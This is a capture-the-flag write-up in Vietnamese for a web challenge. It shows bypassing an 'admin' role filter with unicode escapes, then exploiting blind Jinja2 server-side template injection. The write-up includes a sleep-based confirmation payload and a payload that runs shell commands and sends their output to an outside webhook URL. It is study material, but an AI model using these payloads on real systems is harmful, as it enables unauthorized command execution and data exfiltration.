# Đề bài:

![Screenshot 2024-11-08 171245](https://github.com/user-attachments/assets/3eda7452-5bbe-4af0-9e87-d3fab49c075d)

# Walkthrough:
- Do writeup này được viết khi giải đã kết thúc nên chúng ta sẽ làm trên localhost
### Step 1: Lấy role admin:
- Chúng ta sẽ phải vào register để đăng kí tài khoản trước:
  
![Screenshot 2024-11-08 171944](https://github.com/user-attachments/assets/a4684073-9cf3-4201-a183-249d70733f9f)

- Tiến hành đăng kí tài khoản xong check proxy ta có:

![Screenshot 2024-11-08 173005](https://github.com/user-attachments/assets/f6b198f3-125e-4679-8c13-7a7b9ba32331)

- Vậy nên ta chỉ cần đổi role thành admin là có quyền admin, tuy nhiên đoạn code này đã filter "admin" lại, vậy thì chúng ta sẽ phải mã hóa chữ admin để bypass
- Ở đây ta xài dạng unicode của chữ admin là: \u0061\u0064\u006d\u0069\u006e
![Screenshot 2024-11-08 173251](https://github.com/user-attachments/assets/ca9c264b-73ae-4edc-83e3-a665727374eb)

- Vậy là ta đã có được role admin
### Step 2: Blind SSTI:
- Sau khi đăng nhập thành công, ta vào render và sửa 1 số phần đề phù hợp với 1 request POST hợp lệ(Đôi http method, thêm content type, thêm value):
![Screenshot 2024-11-08 173716](https://github.com/user-attachments/assets/9d545ee4-538d-4fc8-b692-d6f57b7a8b9b)

```
    data = request.get_json()
    template = data.get("template")
    rendered_template = render_template_string(template)
```
- Đây chắc chắn là vuln ssti và khi gửi thành công, server trả vể là done => blind ssti
- Để kiếm chứng hãy ốp payload: ```{{ cycler.__init__.__globals__.os.popen('sleep 10').read() }}``` vô và kiểm chứng
![Screenshot 2024-11-08 174110](https://github.com/user-attachments/assets/bcc04e4c-74f7-45c9-ae58-450c4398f192)
- Thời gian server trả kết quả là 10 229 milis, tức là hơn 10s 1 xíu => Confirm là inject
- Cách làm là ta sẽ tìm cách chuyển kết quả của câu lệnh sang trang webhook
- Payload:
  ```
  url_for.__globals__['__builtins__']['__import__']('urllib2').urlopen('https://123/?flag=' + url_for.__globals__['os'].popen('cat * | grep \"ISIT\"').read())
  ```
- Flag sẽ được in ra ở respone
